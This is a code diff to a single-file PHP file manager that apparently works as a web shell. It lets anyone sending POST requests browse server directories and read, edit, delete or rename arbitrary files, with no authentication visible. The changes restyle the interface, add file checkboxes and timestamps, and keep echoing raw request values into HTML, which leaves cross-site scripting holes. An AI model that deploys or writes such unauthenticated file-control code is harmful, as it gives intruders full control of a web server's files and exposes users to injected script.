@@ -1,5 +1,4 @@
 <style type="text/css">
-
 	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
 	body {
 		font-family: 'Ubuntu Mono', monospace;
@@ -21,10 +20,7 @@
 	}
 	td {
 		padding:5px;
-		border-top:none;
-		border-bottom: 1px solid rgba(222,222,222,0.73);
-		border-right: none;
-		border-left: none;
+		border:none;
 	}
 	td.no-border {
 		border:none;
@@ -35,10 +31,12 @@
 		background:none;
 		border:none;
 	}
+	button:focus {
+		outline:none;
+	}
 	select:focus, 
 	input:focus,
-	textarea:focus,
-	button:focus {
+	textarea:focus {
 		outline:none;
 	}
 	button:hover {
@@ -59,8 +57,10 @@
 		content: "";
 		padding:4px;
 		background: #fff;
-		border-radius:5px;
-		border:2px solid rgba(222,222,222,0.73);
+		border-top: none;
+		border-left: none;
+		border-right: none;
+		border-bottom:2px solid rgba(222,222,222,0.73);
 	}
 	input[type=text] {
 		width:100%;
@@ -72,6 +72,20 @@
 		border-radius:5px;
 		border:2px solid rgba(222,222,222,0.73);
 	}
+	input[type=submit] {
+		width:100%;
+		color: #8a8a8a;
+		font-family: 'Ubuntu Mono', monospace;
+		content: "";
+		padding:7px;
+		background: #fff;
+		border-radius:5px;
+		border:2px solid rgba(222,222,222,0.73);
+	}
+	input[type=submit]:hover {
+		cursor: pointer;
+		border:2px solid #ff9696;
+	}
 	span.action {
 		font-size:30px;
 	}
@@ -82,9 +96,18 @@
 	td.icon {
 		width:10px;
 	}
+	::-moz-selection {
+		color: #fff;
+		background: #ffadad;
+	}
+	::selection {
+		color: #fff;
+		background: #ffadad;
+	}
 </style>
-<table align="center" width="50%">
+<table align="center" width="60%">
 <?php
+date_default_timezone_set('Asia/Jakarta');
 function cwd() {
 	if (isset($_POST['dir'])) {
 		$cwd = $_POST['dir'];
@@ -125,7 +148,6 @@ class Files {
     			}
     		} print("'>{$pwd}</button>");
     	}
-    	return $this->permission(cwd());
     }
 
     function permission_file($filename, $perms) {
@@ -186,6 +208,9 @@ class Files {
     			break;
     		case 'ico':
     			print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
+    			break;
+    		case 'png':
+    			print("https://image.flaticon.com/icons/png/128/136/136523.png");
     			break;
     		default:
     			print("https://image.flaticon.com/icons/svg/833/833524.svg");
@@ -266,34 +291,48 @@ class Files {
 $file = new Files();
 switch (@$_POST['action']) {
 	case 'rename':
-		if (isset($_POST['submit'])) {
+		if (isset($_POST['newname'])) {
 			$rename = $file->renames($_POST['file'], $_POST['newname']);
 			if ($rename) {
 				alert("success", "rename success");
 			} else {
 				alert("failed", "rename failed");
 			}
+			$_POST['name'] = $_POST['file'];
 		}
 		switch ($_POST['file']) {
-			case filetype($_POST['file']) == 'dir' :
+			case @filetype($_POST['file']) == 'dir' :
 				?>
 				<tr>
-					<th colspan="2">
+					<th colspan="4">
 						<span class="action">RENAME</span>
 					</th>
 				</tr>
 				<tr>
-					<td class="no-border" colspan="2">
-						Filename : <?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?> <br>
+					<td class="no-border" style="width:100px;">
+						Filename
+					</td>
+					<td class="no-border"><center>:</center></td>
+					<td class="no-border">
+						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
+					</td>
+				</tr>
+				<tr>
+					<td class="no-border" style="width:100px;">
+						Last Update
+					</td>
+					<td class="no-border"><center>:</center></td>
+					<td class="no-border">
+						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 					</td>
 				</tr>
 				<tr>
 					<form method="post">
-						<td class="no-border" colspan="2">
+						<td class="no-border" colspan="3">
 							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-								<option value="back">back</option>
-								<option value="delete">delete</option>
-								<option value="rename"selected>rename</option>
+								<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
+								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+								<option value="rename" selected><span>&#9998;</span>&nbsp;  RENAME</option>
 							</select>
 							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
 							<input type="hidden" name="file" value="<?=$_POST['file']?>">
@@ -301,11 +340,11 @@ switch (@$_POST['action']) {
 					</form>
 				</tr>
 					<form method="post">
-						<td class="no-border">
-							<input type="text" name="newname" value="<?= $_POST['file'] ?>">
+						<td class="no-border" colspan="3">
+							<input type="text" name="newname" value="<?= $_POST['name'] ?>">
 						</td>
-						<td class="no-border">
-							<input type="submit" name="submit">
+						<td class="no-border" colspan="3">
+							<input type="submit">
 							<input type="hidden" name="action" value="rename">
 							<input type="hidden" name="file" value="<?=$_POST['file']?>">
 						</td>
@@ -314,38 +353,50 @@ switch (@$_POST['action']) {
 				<?php
 				break;
 			
-			case filetype($_POST['file']) == 'file' :
+			case @filetype($_POST['file']) == 'file' :
 				?>
 				<tr>
-					<th colspan="2">
+					<th colspan="4">
 						<span class="action">RENAME</span>
 					</th>
 				</tr>
 				<tr>
-					<td class="no-border" colspan="2">
-						Filename : <?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?> <br>
+					<td class="no-border" style="width:100px;">
+						Filename
+					</td>
+					<td class="no-border"><center>:</center></td>
+					<td class="no-border">
+						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
+					</td>
+				</tr>
+				<tr>
+					<td class="no-border" style="width:100px;">
+						Last Update
+					</td>
+					<td class="no-border"><center>:</center></td>
+					<td class="no-border">
+						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 					</td>
 				</tr>
 				<tr>
 					<form method="post">
-						<td class="no-border" colspan="2">
+						<td class="no-border" colspan="3">
 							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-								<option value="back">back</option>
-								<option value="edit">edit</option>
-								<option value="delete">delete</option>
-								<option value="rename"selected>rename</option>
+								<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
+								<option value="edit"><span>&#9997;</span>&nbsp; EDIT</option>
+								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+								<option value="rename" selected><span>&#9998;</span>&nbsp;  RENAME</option>
 							</select>
-							<?= $_POST['dirs'] ?>
 							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
 							<input type="hidden" name="file" value="<?=$_POST['file']?>">
 						</td>
 					</form>
 				</tr>
 					<form method="post">
-						<td class="no-border">
+						<td class="no-border" colspan="3">
 							<input type="text" name="newname" value="<?= $_POST['file'] ?>">
 						</td>
-						<td class="no-border">
+						<td class="no-border" colspan="3">
 							<input type="submit" name="submit">
 							<input type="hidden" name="action" value="rename">
 							<input type="hidden" name="file" value="<?=$_POST['file']?>">
@@ -358,33 +409,48 @@ switch (@$_POST['action']) {
 		exit();
 		break;
 	case 'edit':
+		?>
+		<tr>
+			<th colspan="3">
+				<span class="action">EDIT</span>
+			</th>
+		</tr>
+		<?php
 		if (isset($_POST['submit'])) {
 			$edit = $file->edit($_POST['file'], $_POST['text']);
 			if ($edit) {
-				alert("failed", "edit failed");
+				$alert = alert("failed", "edit failed");
 			} else {
-				alert("success", "edit success");
+				$alert = alert("success", "edit success");
 			}
 		}
 		?>
 		<tr>
-			<th>
-				<span class="action">EDIT</span>
-			</th>
+			<td class="no-border" style="width:100px;">
+				Filename
+			</td>
+			<td class="no-border"><center>:</center></td>
+			<td class="no-border">
+				<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
+			</td>
 		</tr>
 		<tr>
+			<td class="no-border" style="width:100px;">
+				Last Update
+			</td>
+			<td class="no-border"><center>:</center></td>
 			<td class="no-border">
-				Filename : <?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?> <br>
+				<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
 			</td>
 		</tr>
 		<tr>
 			<form method="post">
-				<td class="no-border">
+				<td class="no-border" colspan="3">
 					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-						<option value="back">back</option>
-						<option value="edit" selected>edit</option>
-						<option value="delete">delete</option>
-						<option value="rename">rename</option>
+						<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
+						<option value="edit"selected><span>&#9997;</span>&nbsp; EDIT</option>
+						<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+						<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
 					</select>
 					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
 					<input type="hidden" name="file" value="<?=$_POST['file']?>">
@@ -393,13 +459,13 @@ switch (@$_POST['action']) {
 		</tr>
 		<tr>
 			<form method="post">
-				<td class="no-border">
+				<td class="no-border" colspan="3">
 					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
 				</td>
 		</tr>
 		<tr>
-			<td class="no-border">
-				<button type="submit" name="submit">EDIT</button>
+			<td class="no-border" colspan="3">
+				<input type="submit" name="submit" value="EDIT">
 				<input type="hidden" name="action" value="edit">
 				<input type="hidden" name="file" value="<?=$_POST['file']?>">
 			</td>
@@ -413,7 +479,7 @@ switch (@$_POST['action']) {
 		break;
 	case 'back':
 		if (isset($_POST['dirs'])) {
-			chdir($_POST['dirs']);
+			chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
 		}
 		?>
 		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
@@ -423,8 +489,8 @@ switch (@$_POST['action']) {
 ?>
 <tr>
 	<form method="post">
-		<th colspan="5">
-			<?= $file->pwd() ?>
+		<th colspan="6">
+			<?= $file->pwd() ?> ( <?= $file->permission(cwd()) ?> )
 		</th>
 	</form>
 </tr>
@@ -434,6 +500,9 @@ foreach ($iterator as $dir) {
 	if ($dir->isDir() && $dir != '.' && $dir != '..') {
 		?>
 		<tr>
+			<td>
+				<input type="checkbox" name="data[]" value="<?= $dir->getPathname() ?>">
+			</td>
 			<td class="icon">
 				<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
 			</td>
@@ -458,8 +527,8 @@ foreach ($iterator as $dir) {
 				<td>
 					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 						<option selected>CHOOSE . .</option>
-						<option value="delete">DELETE</option>
-						<option value="rename">RENAME</option>
+						<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+						<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
 					</select>
 					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
 					<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -473,6 +542,9 @@ foreach ($iterator as $files) {
 	if ($files->isFile()) {
 		?>
 		<tr>
+			<td style="width:1%;">
+				<input type="checkbox" name="data[]" value="<?= $files->getPathname() ?>">
+			</td>
 			<td class="icon">
 				<?= $file->img($files->getPathname()) ?>
 			</td>
@@ -491,14 +563,40 @@ foreach ($iterator as $files) {
 			</td>
 			<form method="post">
 				<td>
-					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
-						<option selected>CHOOSE . .</option>
-						<option value="edit">EDIT</option>
-						<option value="delete">DELETE</option>
-						<option value="rename">RENAME</option>
-					</select>
-					<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
-					<input type="hidden" name="dirs" value="<?= cwd() ?>">
+					<?php
+					$exttension = strtolower(pathinfo($files->getPathname(), PATHINFO_EXTENSION));
+					switch ($exttension) {
+						case 'png':
+						case 'jpg':
+						case 'jpeg':
+						case 'gif':
+						case 'bmp':
+						case 'ico':
+							?>
+							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+								<option selected>CHOOSE . .</option>
+								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+								<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
+							<input type="hidden" name="dirs" value="<?= cwd() ?>">
+							<?php
+							break;
+						
+						default:
+							?>
+							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+								<option selected>CHOOSE . .</option>
+								<option value="edit"><span>&#9997;</span>&nbsp; EDIT</option>
+								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
+								<option value="rename"><span>&#9998;</span>&nbsp;  RENAME</option>
+							</select>
+							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
+							<input type="hidden" name="dirs" value="<?= cwd() ?>">
+							<?php
+							break;
+					}
+					?>
 				</td>
 			</form>
 		</tr>
